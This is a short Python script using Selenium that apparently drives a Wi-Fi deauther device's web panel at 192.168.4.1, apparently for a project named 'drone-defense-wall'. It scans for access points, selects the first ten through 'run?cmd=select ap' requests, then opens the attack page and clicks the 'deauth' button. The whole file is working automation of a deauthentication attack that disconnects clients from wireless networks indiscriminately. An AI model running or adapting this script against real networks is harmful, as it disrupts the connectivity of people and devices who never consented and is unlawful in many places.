# imports
import requests
import bs4
from selenium import webdriver
import time

browser=webdriver.Firefox(executable_path="/home/dhruv/drone-defense-wall/notebooks/geckodriver")

browser.get("http://192.168.4.1/scan.html")
aps_scan=browser.find_element_by_id("scanZero")
aps_scan.click()

try:
    browser.get("http://192.168.4.1/run?cmd=select%20ap%200")
    browser.get("http://192.168.4.1/run?cmd=select%20ap%201")
    browser.get("http://192.168.4.1/run?cmd=select%20ap%202")
    browser.get("http://192.168.4.1/run?cmd=select%20ap%203")
    browser.get("http://192.168.4.1/run?cmd=select%20ap%204")
    browser.get("http://192.168.4.1/run?cmd=select%20ap%205")
    browser.get("http://192.168.4.1/run?cmd=select%20ap%206")
    browser.get("http://192.168.4.1/run?cmd=select%20ap%207")
    browser.get("http://192.168.4.1/run?cmd=select%20ap%208")
    browser.get("http://192.168.4.1/run?cmd=select%20ap%209")

except: 
    pass
else:
    pass

browser.get("http://192.168.4.1/attack.html")

deauth_btn=browser.find_element_by_id("deauth")

time.sleep(0.5)

deauth_btn.click()